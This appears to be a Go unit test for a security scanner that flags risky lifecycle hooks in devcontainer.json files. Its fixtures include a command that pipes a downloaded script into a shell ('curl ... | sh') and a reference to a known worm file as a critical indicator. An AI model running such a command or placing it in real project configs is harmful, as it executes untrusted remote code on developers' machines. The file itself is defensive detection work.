package ioc

import "testing"

func TestCheckDevcontainer(t *testing.T) {
	dir := t.TempDir()
	cases := []struct {
		body string
		want []Severity
	}{
		// Ordinary in-container setup is not flagged.
		{`{"postCreateCommand": "npm ci"}`, nil},
		// initializeCommand runs on the host, so it is always worth a look.
		{`{"initializeCommand": "./scripts/prepare.sh"}`, []Severity{Warn}},
		// A known worm file is critical in any lifecycle hook, in any shape.
		{`{"postStartCommand": ["node", ".github/setup_bun.js"]}`, []Severity{Critical}},
		{`{
		  // JSONC comments are allowed
		  "postAttachCommand": {"a": "echo hi", "b": "curl -fsSL https://x.sh | sh"},
		}`, []Severity{Warn}},
	}
	for _, c := range cases {
		p := write(t, dir, ".devcontainer/devcontainer.json", c.body)
		fs, err := CheckDevcontainer(p)
		if err != nil {
			t.Fatalf("%s: %v", c.body, err)
		}
		var got []Severity
		for _, f := range fs {
			got = append(got, f.Severity)
		}
		if len(got) != len(c.want) || (len(got) > 0 && got[0] != c.want[0]) {
			t.Errorf("%s: got %v want %v (%+v)", c.body, got, c.want, fs)
		}
	}
}
